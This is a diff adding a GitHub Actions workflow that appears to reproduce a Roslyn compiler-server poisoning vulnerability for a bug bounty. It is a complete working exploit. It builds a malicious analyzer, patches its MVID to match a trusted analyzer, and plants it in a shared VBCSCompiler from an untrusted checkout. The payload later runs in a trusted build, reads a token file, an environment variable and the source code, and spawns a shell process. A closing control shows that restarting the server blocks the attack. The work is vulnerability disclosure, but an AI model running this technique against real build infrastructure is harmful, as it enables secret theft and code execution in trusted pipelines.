@@ -1,0 +1,312 @@
+name: roslyn-trusted-environment-boundary-lab
+
+on:
+  push:
+    branches:
+      - dotnet-bounty-lab-20260921
+    paths:
+      - .github/workflows/roslyn-trusted-environment-boundary-lab.yml
+
+permissions:
+  contents: read
+
+jobs:
+  reproduce:
+    runs-on: ubuntu-latest
+    timeout-minutes: 20
+    steps:
+      - uses: actions/checkout@v4
+
+      - uses: actions/setup-dotnet@v4
+        with:
+          dotnet-version: '10.0.x'
+
+      - name: Build trusted and malicious analyzer fixtures
+        shell: bash
+        run: |
+          set -euo pipefail
+          rm -rf /tmp/roslyn-reuse-fixtures /tmp/reused-agent-workspace
+          rm -f /tmp/REUSED_WORKSPACE_MARKER /tmp/REUSED_WORKSPACE_PROCESS_MARKER
+          mkdir -p /tmp/roslyn-reuse-fixtures/{trusted,malicious,reader}
+
+          cat > /tmp/roslyn-reuse-fixtures/trusted/CollisionAnalyzer.csproj <<'EOF'
+          <Project Sdk="Microsoft.NET.Sdk">
+            <PropertyGroup>
+              <TargetFramework>net10.0</TargetFramework>
+              <AssemblyName>CollisionAnalyzer</AssemblyName>
+              <Deterministic>true</Deterministic>
+              <DebugType>none</DebugType>
+            </PropertyGroup>
+            <ItemGroup>
+              <Reference Include="Microsoft.CodeAnalysis" HintPath="$(MSBuildSDKsPath)/../Roslyn/bincore/Microsoft.CodeAnalysis.dll" Private="false" />
+            </ItemGroup>
+          </Project>
+          EOF
+          cp /tmp/roslyn-reuse-fixtures/trusted/CollisionAnalyzer.csproj /tmp/roslyn-reuse-fixtures/malicious/CollisionAnalyzer.csproj
+
+          cat > /tmp/roslyn-reuse-fixtures/trusted/CollisionAnalyzer.cs <<'EOF'
+          using System.Collections.Immutable;
+          using Microsoft.CodeAnalysis;
+          using Microsoft.CodeAnalysis.Diagnostics;
+
+          [DiagnosticAnalyzer(LanguageNames.CSharp)]
+          public sealed class CollisionAnalyzer : DiagnosticAnalyzer
+          {
+              private static readonly DiagnosticDescriptor Rule =
+                  new("LAB003", "Lab", "Trusted analyzer executed", "Lab", DiagnosticSeverity.Warning, true);
+              public override ImmutableArray<DiagnosticDescriptor> SupportedDiagnostics => ImmutableArray.Create(Rule);
+              public override void Initialize(AnalysisContext context)
+              {
+                  context.EnableConcurrentExecution();
+                  context.RegisterCompilationAction(static ctx =>
+                      ctx.ReportDiagnostic(Diagnostic.Create(Rule, Location.None)));
+              }
+          }
+          EOF
+
+          cat > /tmp/roslyn-reuse-fixtures/malicious/CollisionAnalyzer.cs <<'EOF'
+          using System.Collections.Immutable;
+          using System.Diagnostics;
+          using System.IO;
+          using System.Linq;
+          using Microsoft.CodeAnalysis;
+          using Microsoft.CodeAnalysis.Diagnostics;
+
+          [DiagnosticAnalyzer(LanguageNames.CSharp)]
+          public sealed class CollisionAnalyzer : DiagnosticAnalyzer
+          {
+              private static readonly DiagnosticDescriptor Rule =
+                  new("LAB003", "Lab", "Stale analyzer executed", "Lab", DiagnosticSeverity.Warning, true);
+              public override ImmutableArray<DiagnosticDescriptor> SupportedDiagnostics => ImmutableArray.Create(Rule);
+              public override void Initialize(AnalysisContext context)
+              {
+                  context.EnableConcurrentExecution();
+                  context.RegisterCompilationAction(static ctx =>
+                  {
+                      var source = string.Join("\n---TREE---\n", ctx.Compilation.SyntaxTrees.Select(t => t.GetText().ToString()));
+                      var laterTokenPath = "/tmp/reused-agent-workspace/.ci/high-value-token.txt";
+                      var laterToken = File.Exists(laterTokenPath)
+                          ? File.ReadAllText(laterTokenPath)
+                          : "<TOKEN_NOT_PRESENT>";
+                      var laterEnvironmentValue = System.Environment.GetEnvironmentVariable("TRUSTED_JOB_ENV_SENTINEL") ?? "<ENV_NOT_PRESENT>";
+                      File.WriteAllText("/tmp/REUSED_WORKSPACE_MARKER",
+                          "ASSEMBLY=" + ctx.Compilation.AssemblyName + "\n" +
+                          "LATER_TRUSTED_TOKEN=" + laterToken + "\n" +
+                          "LATER_TRUSTED_ENV=" + laterEnvironmentValue + "\n" +
+                          source);
+                      if (ctx.Compilation.AssemblyName == "Trusted")
+                      {
+                          Process.Start(new ProcessStartInfo
+                          {
+                              FileName = "/bin/sh",
+                              ArgumentList = { "-c", "printf 'REUSED_WORKSPACE_STALE_CHILD_EXECUTED\\n' > /tmp/REUSED_WORKSPACE_PROCESS_MARKER" },
+                              UseShellExecute = false
+                          })!.WaitForExit();
+                      }
+                      ctx.ReportDiagnostic(Diagnostic.Create(Rule, Location.None));
+                  });
+              }
+          }
+          EOF
+
+          cat > /tmp/roslyn-reuse-fixtures/reader/MvidReader.csproj <<'EOF'
+          <Project Sdk="Microsoft.NET.Sdk">
+            <PropertyGroup><TargetFramework>net10.0</TargetFramework><OutputType>Exe</OutputType></PropertyGroup>
+          </Project>
+          EOF
+          cat > /tmp/roslyn-reuse-fixtures/reader/Program.cs <<'EOF'
+          using System;
+          using System.IO;
+          using System.Reflection.Metadata;
+          using System.Reflection.PortableExecutable;
+          using var s = File.OpenRead(args[0]);
+          using var pe = new PEReader(s);
+          var md = pe.GetMetadataReader();
+          Console.WriteLine(Convert.ToHexString(md.GetGuid(md.GetModuleDefinition().Mvid).ToByteArray()));
+          EOF
+
+          dotnet build /tmp/roslyn-reuse-fixtures/trusted/CollisionAnalyzer.csproj -c Release -v:q
+          dotnet build /tmp/roslyn-reuse-fixtures/malicious/CollisionAnalyzer.csproj -c Release -v:q
+          dotnet build /tmp/roslyn-reuse-fixtures/reader/MvidReader.csproj -c Release -v:q
+
+          trusted=/tmp/roslyn-reuse-fixtures/trusted/bin/Release/net10.0/CollisionAnalyzer.dll
+          malicious=/tmp/roslyn-reuse-fixtures/malicious/bin/Release/net10.0/CollisionAnalyzer.dll
+          reader=/tmp/roslyn-reuse-fixtures/reader/bin/Release/net10.0/MvidReader.dll
+          cp "$malicious" /tmp/roslyn-reuse-fixtures/malicious-unpatched.dll
+          th=$(dotnet "$reader" "$trusted")
+          mh=$(dotnet "$reader" "$malicious")
+
+          python3 - "$malicious" "$mh" "$th" <<'PY'
+          from pathlib import Path
+          import sys
+          p=Path(sys.argv[1]); old=bytes.fromhex(sys.argv[2]); new=bytes.fromhex(sys.argv[3])
+          b=bytearray(p.read_bytes())
+          assert b.count(old)==1, b.count(old)
+          i=b.index(old); b[i:i+16]=new; p.write_bytes(b)
+          PY
+
+          test "$(dotnet "$reader" "$malicious")" = "$th"
+          cp "$malicious" /tmp/roslyn-reuse-fixtures/malicious-patched.dll
+          echo "TRUSTED_MVID=$th"
+          echo "PATCHED_MALICIOUS_MVID=$(dotnet "$reader" "$malicious")"
+          sha256sum "$trusted" /tmp/roslyn-reuse-fixtures/malicious-patched.dll
+
+      - name: Poison compiler server from disposable untrusted checkout with analyzers disabled
+        shell: bash
+        run: |
+          set -euo pipefail
+          dotnet build-server shutdown >/dev/null 2>&1 || true
+          rm -rf /tmp/reused-agent-workspace
+          rm -f /tmp/REUSED_WORKSPACE_MARKER /tmp/REUSED_WORKSPACE_PROCESS_MARKER /tmp/reused-workspace.log
+          mkdir -p /tmp/reused-agent-workspace/tools
+          cp /tmp/roslyn-reuse-fixtures/malicious-patched.dll /tmp/reused-agent-workspace/tools/CollisionAnalyzer.dll
+
+          cat > /tmp/reused-agent-workspace/App.csproj <<'EOF'
+          <Project Sdk="Microsoft.NET.Sdk">
+            <PropertyGroup>
+              <TargetFramework>net10.0</TargetFramework>
+              <OutputType>Exe</OutputType>
+              <AssemblyName>Poison</AssemblyName>
+              <UseSharedCompilation>true</UseSharedCompilation>
+              <RunAnalyzers>false</RunAnalyzers>
+              <RunAnalyzersDuringBuild>false</RunAnalyzersDuringBuild>
+            </PropertyGroup>
+            <ItemGroup>
+              <Analyzer Include="$(MSBuildProjectDirectory)/tools/CollisionAnalyzer.dll" />
+            </ItemGroup>
+          </Project>
+          EOF
+          echo 'System.Console.WriteLine("UNTRUSTED_CHECKOUT_ONLY");' > /tmp/reused-agent-workspace/Program.cs
+
+          export RoslynCommandLineLogFile=/tmp/reused-workspace.log
+          dotnet build /tmp/reused-agent-workspace/App.csproj -c Release -t:Rebuild             -p:UseSharedCompilation=true -p:RunAnalyzers=false -p:RunAnalyzersDuringBuild=false -v:q
+
+          test ! -e /tmp/REUSED_WORKSPACE_MARKER
+          test ! -e /tmp/REUSED_WORKSPACE_PROCESS_MARKER
+          echo "UNTRUSTED_CHECKOUT_ANALYZER_EXECUTION=BLOCKED"
+          echo "UNTRUSTED_CHECKOUT_REMOVING_ENTIRE_WORKSPACE=YES"
+          rm -rf /tmp/reused-agent-workspace
+          test ! -e /tmp/reused-agent-workspace
+
+      - name: Recreate pristine trusted checkout at exact same workspace path
+        shell: bash
+        run: |
+          set -euo pipefail
+          mkdir -p /tmp/reused-agent-workspace/tools
+          cp /tmp/roslyn-reuse-fixtures/trusted/bin/Release/net10.0/CollisionAnalyzer.dll /tmp/reused-agent-workspace/tools/CollisionAnalyzer.dll
+
+          cat > /tmp/reused-agent-workspace/App.csproj <<'EOF'
+          <Project Sdk="Microsoft.NET.Sdk">
+            <PropertyGroup>
+              <TargetFramework>net10.0</TargetFramework>
+              <OutputType>Exe</OutputType>
+              <AssemblyName>Trusted</AssemblyName>
+              <UseSharedCompilation>true</UseSharedCompilation>
+              <RunAnalyzers>true</RunAnalyzers>
+              <RunAnalyzersDuringBuild>true</RunAnalyzersDuringBuild>
+            </PropertyGroup>
+            <ItemGroup>
+              <Analyzer Include="$(MSBuildProjectDirectory)/tools/CollisionAnalyzer.dll" />
+            </ItemGroup>
+          </Project>
+          EOF
+          echo 'System.Console.WriteLine("TRUSTED_CHECKOUT_LATER_SOURCE_SENTINEL_20260921");' > /tmp/reused-agent-workspace/Program.cs
+          mkdir -p /tmp/reused-agent-workspace/.ci
+          printf 'SOFTWARE_TOKEN_CREATED_ONLY_FOR_TRUSTED_JOB_20260921' > /tmp/reused-agent-workspace/.ci/high-value-token.txt
+          export TRUSTED_JOB_ENV_SENTINEL='TRUSTED_ENV_VALUE_CREATED_ONLY_AFTER_POISON_20260921'
+          echo "TRUSTED_ONLY_VALUES_CREATED_AFTER_POISON_WORKSPACE_REMOVAL=YES"
+
+          cmp /tmp/roslyn-reuse-fixtures/trusted/bin/Release/net10.0/CollisionAnalyzer.dll /tmp/reused-agent-workspace/tools/CollisionAnalyzer.dll
+          echo "TRUSTED_CHECKOUT_ANALYZER_ON_DISK=PRISTINE"
+
+          export RoslynCommandLineLogFile=/tmp/reused-workspace.log
+          dotnet build /tmp/reused-agent-workspace/App.csproj -c Release -t:Rebuild             -p:UseSharedCompilation=true -p:RunAnalyzers=true -p:RunAnalyzersDuringBuild=true -v:q
+
+          test -e /tmp/REUSED_WORKSPACE_MARKER
+          test -e /tmp/REUSED_WORKSPACE_PROCESS_MARKER
+          grep -q 'ASSEMBLY=Trusted' /tmp/REUSED_WORKSPACE_MARKER
+          grep -q 'TRUSTED_CHECKOUT_LATER_SOURCE_SENTINEL_20260921' /tmp/REUSED_WORKSPACE_MARKER
+          grep -q 'SOFTWARE_TOKEN_CREATED_ONLY_FOR_TRUSTED_JOB_20260921' /tmp/REUSED_WORKSPACE_MARKER
+          grep -q 'TRUSTED_ENV_VALUE_CREATED_ONLY_AFTER_POISON_20260921' /tmp/REUSED_WORKSPACE_MARKER
+
+          echo "REUSED_CLEAN_WORKSPACE_MVID_BYPASS=CONFIRMED"
+          echo "TRUSTED_CHECKOUT_LATER_SOURCE_READ=CONFIRMED"
+          echo "TRUSTED_ONLY_SOFTWARE_TOKEN_READ=CONFIRMED"
+          echo "TRUSTED_ONLY_ENVIRONMENT_VALUE_READ=CONFIRMED"
+          echo "TRUSTED_CHECKOUT_CHILD_PROCESS_EXECUTION=CONFIRMED"
+          cat /tmp/REUSED_WORKSPACE_MARKER
+          cat /tmp/REUSED_WORKSPACE_PROCESS_MARKER
+          echo "SAME_COMPILER_SERVER_EVIDENCE:"
+          grep -E 'ID=VBCSCompiler .*Begin Analyzer Consistency' /tmp/reused-workspace.log || true
+
+
+      - name: Causal control - restarting VBCSCompiler between jobs removes the poisoned assembly
+        shell: bash
+        run: |
+          set -euo pipefail
+          dotnet build-server shutdown >/dev/null 2>&1 || true
+          rm -rf /tmp/reused-agent-workspace
+          rm -f /tmp/REUSED_WORKSPACE_MARKER /tmp/REUSED_WORKSPACE_PROCESS_MARKER /tmp/restart-control.log
+          mkdir -p /tmp/reused-agent-workspace/tools
+          cp /tmp/roslyn-reuse-fixtures/malicious-patched.dll /tmp/reused-agent-workspace/tools/CollisionAnalyzer.dll
+
+          cat > /tmp/reused-agent-workspace/App.csproj <<'EOF'
+          <Project Sdk="Microsoft.NET.Sdk">
+            <PropertyGroup>
+              <TargetFramework>net10.0</TargetFramework>
+              <OutputType>Exe</OutputType>
+              <AssemblyName>Poison</AssemblyName>
+              <UseSharedCompilation>true</UseSharedCompilation>
+              <RunAnalyzers>false</RunAnalyzers>
+              <RunAnalyzersDuringBuild>false</RunAnalyzersDuringBuild>
+            </PropertyGroup>
+            <ItemGroup>
+              <Analyzer Include="$(MSBuildProjectDirectory)/tools/CollisionAnalyzer.dll" />
+            </ItemGroup>
+          </Project>
+          EOF
+          echo 'System.Console.WriteLine("POISON_RESTART_CONTROL");' > /tmp/reused-agent-workspace/Program.cs
+
+          export RoslynCommandLineLogFile=/tmp/restart-control.log
+          dotnet build /tmp/reused-agent-workspace/App.csproj -c Release -t:Rebuild             -p:UseSharedCompilation=true -p:RunAnalyzers=false -p:RunAnalyzersDuringBuild=false -v:q
+          test ! -e /tmp/REUSED_WORKSPACE_MARKER
+          echo "RESTART_CONTROL_POISON_STAGE_EXECUTION=BLOCKED"
+
+          rm -rf /tmp/reused-agent-workspace
+
+          # This is the one changed variable relative to the successful attack:
+          # terminate the long-lived compiler server before the trusted checkout arrives.
+          dotnet build-server shutdown >/dev/null 2>&1 || true
+          echo "RESTART_CONTROL_VBCSCOMPILER_TERMINATED_BETWEEN_JOBS=YES"
+
+          mkdir -p /tmp/reused-agent-workspace/tools /tmp/reused-agent-workspace/.ci
+          cp /tmp/roslyn-reuse-fixtures/trusted/bin/Release/net10.0/CollisionAnalyzer.dll /tmp/reused-agent-workspace/tools/CollisionAnalyzer.dll
+          printf 'RESTART_CONTROL_TRUSTED_TOKEN_20260921' > /tmp/reused-agent-workspace/.ci/high-value-token.txt
+
+          cat > /tmp/reused-agent-workspace/App.csproj <<'EOF'
+          <Project Sdk="Microsoft.NET.Sdk">
+            <PropertyGroup>
+              <TargetFramework>net10.0</TargetFramework>
+              <OutputType>Exe</OutputType>
+              <AssemblyName>Trusted</AssemblyName>
+              <UseSharedCompilation>true</UseSharedCompilation>
+              <RunAnalyzers>true</RunAnalyzers>
+              <RunAnalyzersDuringBuild>true</RunAnalyzersDuringBuild>
+            </PropertyGroup>
+            <ItemGroup>
+              <Analyzer Include="$(MSBuildProjectDirectory)/tools/CollisionAnalyzer.dll" />
+            </ItemGroup>
+          </Project>
+          EOF
+          echo 'System.Console.WriteLine("TRUSTED_RESTART_CONTROL");' > /tmp/reused-agent-workspace/Program.cs
+
+          dotnet build /tmp/reused-agent-workspace/App.csproj -c Release -t:Rebuild             -p:UseSharedCompilation=true -p:RunAnalyzers=true -p:RunAnalyzersDuringBuild=true -v:q
+
+          if test -e /tmp/REUSED_WORKSPACE_MARKER || test -e /tmp/REUSED_WORKSPACE_PROCESS_MARKER; then
+            echo "RESTART_CONTROL=FAIL"
+            exit 1
+          fi
+
+          echo "RESTART_CONTROL=PASS"
+          echo "CAUSALITY_LONG_LIVED_VBCSCOMPILER_REQUIRED=CONFIRMED"
+          grep -E 'ID=VBCSCompiler .*Begin Analyzer Consistency' /tmp/restart-control.log || true
